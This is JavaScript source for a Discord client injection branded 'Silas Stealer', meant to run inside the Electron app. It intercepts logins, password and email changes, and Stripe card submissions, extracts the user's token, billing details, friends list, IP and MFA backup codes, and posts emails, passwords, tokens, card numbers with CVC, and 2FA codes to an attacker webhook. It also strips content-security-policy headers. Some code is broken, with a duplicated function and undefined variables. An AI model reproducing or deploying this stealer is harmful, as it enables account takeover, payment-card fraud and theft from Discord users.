const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron')

const UrlFilter = {
    urls: ["https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};

const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
var sexhook = "dumbass";

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(webhook)) {
        if (details.url.includes("discord.com")) {
            callback({
                responseHeaders: Object.assign({
                    'Access-Control-Allow-Headers': "*"
                }, details.responseHeaders)
            });
        } else {
            callback({
                responseHeaders: Object.assign({
                    "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                    'Access-Control-Allow-Headers': "*",
                    "Access-Control-Allow-Origin": "*"
                }, details.responseHeaders)
            });
        }


    } else {
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];

        callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': "*"
            }
        })
    }

})

const Filter = {
    "urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
function Login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then(() => window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
    xmlHttp.send( null );
    xmlHttp.responseText;
`, !0))
        .then((ip) => window.webContents.executeJavaScript(`
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
xmlHttp.setRequestHeader("Authorization", "${token}");
xmlHttp.send( null );
xmlHttp.responseText`, !0))
        .then((billing) =>
            window.webContents.executeJavaScript(`
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
xmlHttp.setRequestHeader("Authorization", "${token}");
xmlHttp.send( null );
xmlHttp.responseText`, !0))
        .then((frnds) => {
            if (token.startsWith("mfa")) {
                window.webContents.executeJavaScript(`
var xmlHttp = new XMLHttpRequest();
xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
xmlHttp.setRequestHeader('Content-Type', 'application/json');
xmlHttp.setRequestHeader("authorization", "${token}")
xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
xmlHttp.responseText`, !0)
            }
        })
        .then(() => {
            var sexxxx = []
            var boobs = JSON.parse(codes)
            var ass = boobs.backup_codes
            const pussy = ass.filter((code) => {
                return code.consumed == null
            })
            for (let hair in pussy) {
                sexxxx.push({ name: `Code`, value: `\`${r[z].code.insert(4, "-")}\``, inline: true })
            }
            const aids = JSON.parse(body);
            var ovum = {
                username: "Silas Stealer",
                content: "",
                embeds: [{
                    "title": "Password Changed",
                    description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/token" + "<br>" + newpassword + ")",
                    "color": config['embed-color'],
                    "fields": [{
                        name: "Username",
                        value: `\`${aids.username}#${aids.discriminator}\``,
                        inline: !0
                    }, {
                        name: "ID",
                        value: `\`${aids.id}\``,
                        inline: !0
                    }, {
                        name: "Nitro",
                        value: `${GetNitro(aids.premium_type)}`,
                        inline: !1
                    }, {
                        name: "Badges",
                        value: `${GetBadges(aids.flags)}`,
                        inline: !1
                    }, {
                        name: "Billing",
                        value: `${PM(JSON.parse(billing))}`,
                        inline: !1
                    }, {
                        name: "Email",
                        value: `\`${aids.email}\``,
                        inline: !1
                    }, {
                        name: "Old Password",
                        value: `\`${oldpassword}\``,
                        inline: !0
                    }, {
                        name: "New Password",
                        value: `\`${newpassword}\``,
                        inline: !0
                    }, {
                        name: "Token",
                        value: `\`\`\`${token}\`\`\``,
                        inline: !1
                    },],
                    "author": {
                        "name": "Silas Stealer"
                    },
                    "footer": {
                        "text": "Silas Stealer"
                    },
                    "thumbnail": {
                        "url": `https://cdn.discordapp.com/avatars/${aids.id}/${aids.avatar}`
                    }
                }, {
                    "title": `Total Friends (${totalFriends(JSON.parse(frnds))})`,
                    "color": config['embed-color'],
                    "description": CalcFriends(JSON.parse(frnds)),
                    "author": {
                        "name": "Silas Stealer"
                    },
                    "footer": {
                        "text": "Silas Stealer"
                    },
                    "thumbnail": {
                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                    }
                }]
            }
            var sperm = {
                "title": ":detective: __2FA Codes__",
                "description": `[Get all of them](${baseuri})`,
                "color": config['embed-color'],
                "fields": sexxxx,
                "author": {
                    "name": "Silas Stealer"
                },
                "footer": {
                    "text": "Silas Stealer"
                }
            }
            if (token.startsWith("mfa")) {
                ovum.embeds.push(sperm)
            }
            SendToWebhook(JSON.stringify(ovum))
        })
}


function ChangePassword(oldpassword, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((body) =>
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0))
        .then((ip) =>
            window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0))
        .then((billing) =>
            window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0))
        .then((frnds) => {
            if (token.startsWith("mfa")) {
                window.webContents.executeJavaScript(`
              var xmlHttp = new XMLHttpRequest();
              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
              xmlHttp.setRequestHeader('Content-Type', 'application/json');
              xmlHttp.setRequestHeader("authorization", "${token}")
              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
              xmlHttp.responseText`, !0)
            }
        }).then((codes) => {
            var sexxxx = []
            var boobs = JSON.parse(codes)
            var ass = boobs.backup_codes
            const pussy = ass.filter((code) => {
                return code.consumed == null
            })
            for (let hair in pussy) {
                sexxxx.push({
                    name: `Code`,
                    value: `\`${r[z].code.insert(4, "-")}\``,
                    inline: true
                })
            }
            const aids = JSON.parse(body)
            var ovum = {
                username: "Silas Stealer",
                content: "",
                embeds: [{
                    "title": "Password Changed",
                    description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/token" + "<br>" + newpassword + ")",
                    "color": config['embed-color'],
                    "fields": [{
                        name: "Username",
                        value: `\`${aids.username}#${aids.discriminator}\``,
                        inline: !0
                    }, {
                        name: "ID",
                        value: `\`${aids.id}\``,
                        inline: !0
                    }, {
                        name: "Nitro",
                        value: `${GetNitro(aids.premium_type)}`,
                        inline: !1
                    }, {
                        name: "Badges",
                        value: `${GetBadges(aids.flags)}`,
                        inline: !1
                    }, {
                        name: "Billing",
                        value: `${PM(JSON.parse(billing))}`,
                        inline: !1
                    }, {
                        name: "Email",
                        value: `\`${aids.email}\``,
                        inline: !1
                    }, {
                        name: "Old Password",
                        value: `\`${oldpassword}\``,
                        inline: !0
                    }, {
                        name: "New Password",
                        value: `\`${newpassword}\``,
                        inline: !0
                    }, {
                        name: "Token",
                        value: `\`\`\`${token}\`\`\``,
                        inline: !1
                    }],
                    "author": {
                        "name": "Silas Stealer"
                    },
                    "footer": {
                        "text": "Silas Stealer"
                    },
                    "thumbnail": {
                        "url": `https://cdn.discordapp.com/avatars/${aids.id}/${aids.avatar}`
                    }
                }, {
                    "title": `Total Friends (${totalFriends(JSON.parse(frnds))})`,
                    "color": config['embed-color'],
                    "description": CalcFriends(JSON.parse(frnds)),
                    "author": {
                        "name": "Silas Stealer"
                    },
                    "footer": {
                        "text": "Silas Stealer"
                    },
                    "thumbnail": {
                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                    }
                }]
            }
            var sperm = {
                "title": ":detective: __2FA Codes__",
                "description": `[Get all of them](${baseuri})`,
                "color": config['embed-color'],
                "fields": sexxxx,
                "author": {
                    "name": "Silas Stealer"
                },
                "footer": {
                    "text": "Silas Stealer"
                }
            }


            if (token.startsWith("mfa")) {
                ovum.embeds.push(sperm)
            }

            SendToWebhook(JSON.stringify(ovum))
        })
}

function ChangeEmail(newemail, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((body) =>
        window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
    xmlHttp.send( null );
    xmlHttp.responseText;
`, !0))
        .then((ip) =>
            window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0))
        .then((billing) =>
            window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0))
        .then((frnds) => {

            if (token.startsWith("mfa")) {
                window.webContents.executeJavaScript(`
              var xmlHttp = new XMLHttpRequest();
              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
              xmlHttp.setRequestHeader('Content-Type', 'application/json');
              xmlHttp.setRequestHeader("authorization", "${token}")
              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
              xmlHttp.responseText`, !0)
            }
        }).then((codes) => {
            var sexxxx = []
            var boobs = JSON.parse(codes)
            var ass = boobs.backup_codes
            const pussy = ass.filter((code) => {
                return code.consumed == null
            })
            for (let hair in pussy) {
                sexxxx.push({ name: `Code`, value: `\`${r[z].code.insert(4, "-")}\``, inline: true })
            }
            const aids = JSON.parse(body)
            var ovum = {
                username: "Silas Stealer",
                content: "",
                embeds: [{
                    "title": "Email Changed",
                    description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/token" + "<br>" + password + ")",
                    "color": config['embed-color'],
                    "fields": [{
                        name: "Username",
                        value: `\`${aids.username}#${aids.discriminator}\``,
                        inline: !0
                    }, {
                        name: "ID",
                        value: `\`${aids.id}\``,
                        inline: !0
                    }, {
                        name: "Nitro",
                        value: `${GetNitro(aids.premium_type)}`,
                        inline: !1
                    }, {
                        name: "Badges",
                        value: `${GetBadges(aids.flags)}`,
                        inline: !1
                    }, {
                        name: "Billing",
                        value: `${PM(JSON.parse(billing))}`,
                        inline: !1
                    }, {
                        name: "Email",
                        value: `\`${newemail}\``,
                        inline: !1
                    }, {
                        name: "Password",
                        value: `\`${password}\``,
                        inline: !0
                    }, {
                        name: "Token",
                        value: `\`\`\`${token}\`\`\``,
                        inline: !1
                    },],
                    "author": {
                        "name": "Silas Stealer"
                    },
                    "footer": {
                        "text": "Silas Stealer"
                    },
                    "thumbnail": {
                        "url": `https://cdn.discordapp.com/avatars/${aids.id}/${aids.avatar}`
                    }
                }, {
                    "title": `Total Friends (${totalFriends(JSON.parse(frnds))})`,
                    "color": config['embed-color'],
                    "description": CalcFriends(JSON.parse(frnds)),
                    "author": {
                        "name": "Silas Stealer"
                    },
                    "footer": {
                        "text": "Silas Stealer"
                    },
                    "thumbnail": {
                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                    }
                }]
            }
            var sperm = {
                "title": ":detective: __2FA Codes__",
                "description": `[Get all of them](${baseuri})`,
                "color": config['embed-color'],
                "fields": sexxxx,
                "author": {
                    "name": "Silas Stealer"
                },
                "footer": {
                    "text": "Silas Stealer"
                }
            }
            if (token.startsWith("mfa")) {
                ovum.embeds.push(sperm)
            }
            SendToWebhook(JSON.stringify(ovum))
        })
}

function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {

        var json = JSON.parse(info);
        var params = {
            username: "Silas Stealer ",
            content: "",
            embeds: [{
                "title": "User Credit Card Added",
                "description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
                "author": {
                    "name": "Silas Stealer"
                },
                "footer": {
                    "text": "Silas Stealer"
                },
                "thumbnail": {
                    "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
                }
            }]
        }
        SendToWebhook(JSON.stringify(params))

    })
}


//🕺🕺🕺🕺assets
function SendToWebhook(info) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
        xhr.open("POST", "${webhook}", true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
        xhr.send(JSON.stringify(${info}));
    `, !0)
}


function SendToWebhook(info) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
        xhr.open("POST", "${sexhook}", true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
        xhr.send(JSON.stringify(${info}));
    `, !0)
}
function GetBadges(flags) {

    const Discord_Employee = 1;

    const Partnered_Server_Owner = 2;
    const HypeSquad_Events = 4;
    const Bug_Hunter_Level_1 = 8;
    const House_Bravery = 64;
    const House_Brilliance = 128;
    const House_Balance = 256;
    const Early_Supporter = 512;
    const Bug_Hunter_Level_2 = 16384;
    const Early_Verified_Bot_Developer = 131072;
    var badges = "";
    if ((flags & Discord_Employee) == Discord_Employee) {
        badges += "<a:dcstaff:940586479971860510> "
    }
    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
        badges += "<:dcpartner:940586351659724810>"
    }
    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
        badges += "<:dchypeevents:940586822088671282> "
    }
    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
        badges += "<:dcnormalbughunter:940586637279248395>"
    }
    if ((flags & House_Bravery) == House_Bravery) {
        badges += "<:dcbravery:940586879307366460>"
    }
    if ((flags & House_Brilliance) == House_Brilliance) {
        badges += "<:dcbrilliance:940586946529472572>"
    }
    if ((flags & House_Balance) == House_Balance) {
        badges += "<:dcbalance:940587001428705291>"
    }
    if ((flags & Early_Supporter) == Early_Supporter) {
        badges += "<a:dcearly:940586245292171275>"
    }
    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
        badges += "<:dcshinybughunter:940586543318446091>"
    }
    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
        badges += "<:dcdev:940586119840550992>"
    }
    if (badges == "") {
        badges = "None"
    }
    return badges
}

function GetNitro(flags) {
    if (flags == 0) {
        return "No Nitro"
    }
    if (flags == 1) {
        return " <a:classic:940587229443674142>   \`Nitro Classic\`"
    }
    if (flags == 2) {
        return "<a:nitrobooster:940587164385824768> \`Nitro Boost\`"
    } else {
        return "No Nitro"
    }
}
function totalFriends(f) {

    const r = f.filter((user) => {

        return user.type == 1
    })
    return r.length
}

function CalcFriends(f) {

    const r = f.filter((user) => {
        return user.type == 1
    })
    var gay = "";
    for (z of r) {
        var b = GetRBadges(z.user.public_flags)
        if (b != "") {
            gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
        }
    }
    if (gay == "") {
        gay = "No Rare Friends"
    }
    return gay
}

function GetRBadges(flags) {
    const Discord_Employee = 1;
    const Partnered_Server_Owner = 2;
    const HypeSquad_Events = 4;
    const Bug_Hunter_Level_1 = 8;
    const Early_Supporter = 512;
    const Bug_Hunter_Level_2 = 16384;
    const Early_Verified_Bot_Developer = 131072;
    var badges = "";
    if ((flags & Discord_Employee) == Discord_Employee) {
        badges += "<:staff:874750808728666152> "
    }
    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
        badges += "<:partner:874750808678354964> "
    }
    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
        badges += "<:hypesquad_events:874750808594477056> "
    }
    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
        badges += "<:bughunter_1:874750808426692658> "
    }
    if ((flags & Early_Supporter) == Early_Supporter) {
        badges += "<:early_supporter:874750808414113823> "
    }
    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
        badges += "<:bughunter_2:874750808430874664> "
    }
    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
        badges += "<:developer:874750808472825986> "
    }
    if (badges == "") {
        badges = ""
    }
    return badges
}


function PM(pm) {

    var billing = "";
    pm.forEach(z => {
        if (z.type == "") {
            return "\`❌\`"
        } else if (z.type == 2 && z.invalid != !0) {
            billing += "\`✔️\`" + " <:paypal:896441236062347374>"
        } else if (z.type == 1 && z.invalid != !0) {
            billing += "\`✔️\`" + " :credit_card:"
        } else {
            return "\`❌\`"
        }
    })
    if (billing == "") {
        billing = "\`❌\`"
    }
    return billing
}



////sexxxxxxx
session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => {
    if (details.url.endsWith("login")) {
        if (details.statusCode == 200) {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            const email = data.login;
            const password = data.password;
            const window = BrowserWindow.getAllWindows()[0];
            window.webContents.executeJavaScript(TokenEval, !0).then((token => {
                Login(email, password, token)
            }))
        }
    }
    if (details.url.endsWith("users/@me")) {
        if (details.statusCode == 200 && details.method == "PATCH") {
            const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
            if (data.password != null && data.password != undefined && data.password != "") {
                if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(TokenEval, !0).then((token => {
                        ChangePassword(data.password, data.new_password, token)
                    }))
                }
                if (data.email != null && data.email != undefined && data.email != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(TokenEval, !0).then((token => {
                        ChangeEmail(data.email, data.password, token)
                    }))
                }
            }
        }
    }
    if (details.url.endsWith("tokens")) {
        const item = querystring.parse(details.uploadData[0].bytes.toString())
        const window = BrowserWindow.getAllWindows()[0];
        window.webContents.executeJavaScript(TokenEval, !0).then((token => {
            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
        }))
    }
});

module.exports = require('./core.asar')
